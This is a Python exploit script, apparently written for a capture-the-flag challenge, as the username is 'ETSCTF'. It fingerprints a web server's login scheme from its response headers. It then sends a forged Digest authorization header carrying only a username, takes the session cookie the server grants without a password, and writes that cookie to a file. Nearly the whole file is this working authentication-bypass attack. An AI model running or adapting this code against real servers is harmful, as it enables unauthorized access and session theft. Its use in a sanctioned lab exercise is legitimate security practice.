import sys
import requests


def test_digest(r):
    auth = ["realm", "domain", "qop", "nonce", "opaque", "algorithm", "stale", "MD5", "FALSE", "Digest"]
    wwwauthenticate = r.headers.get('WWW-Authenticate')
    if wwwauthenticate is None:
        return False
    for k in auth:
        if k not in wwwauthenticate:
            return False
    return True


def test_form(r):
    auth = [("X-XSS-Protection", "1; mode=block"), ("X-Content-Type-Options", "nosniff"), ("ETag", None), ("Date", None)]
    potential_auth = [("Last Modified", ""), ("X-Frame-Options", "SAMEORIGIN"), ("Accept-Ranges", "bytes"), ("Content-Type", "text/html")]
    
    if r.headers.get("WWW-Authenticate") is not None:
        return False
    
    for k, v in auth:
        rv = r.headers.get(k)
        if not rv:
            return False
        if v is not None and v != rv:
            return False
            
    potential_count = 0
    for k, v in potential_auth:
        rv = r.headers.get(k)
        if rv and v != "" and v == rv:
            potential_count += 1
            
    return True


def test(url):
    r = requests.get(url)
    serv = r.headers.get("Server")
    
    if serv and "GoAhead" in serv:
        return False
        
    if test_digest(r):
        return "digest"
    elif test_form(r):
        return "form"
        
    return None


def exploit(url, username="joshua", authtype="digest"):
    payload = {"username": username}
    headers = {
        "authorization": "Digest username={}".format(username),
        "user-agent": "TruelBot",
        "content-type": "application/x-www-form-urlencoded",
    }
    
    if authtype == "digest":
        r = requests.get(url, data=payload, headers=headers)
    else:
        r = requests.post(url, data=payload, headers=headers)

    if r.status_code != 200 or len(r.cookies) < 1:
        return
    
    cookie_output = f"{dict(r.cookies)}\n"
    
    with open("needed.txt", "w") as f:  # Use write mode to overwrite the file
        f.write(cookie_output)  # Write the cookie to the file
        print("[*] needed.txt created")  # Indicate that the file was created


if __name__ == "__main__":
    url = "http://10.0.100.172:8080"
    username = "ETSCTF"
    
    t = test(url)
    if t is None:
        sys.exit(1)
    
    exploit(url, username, t)
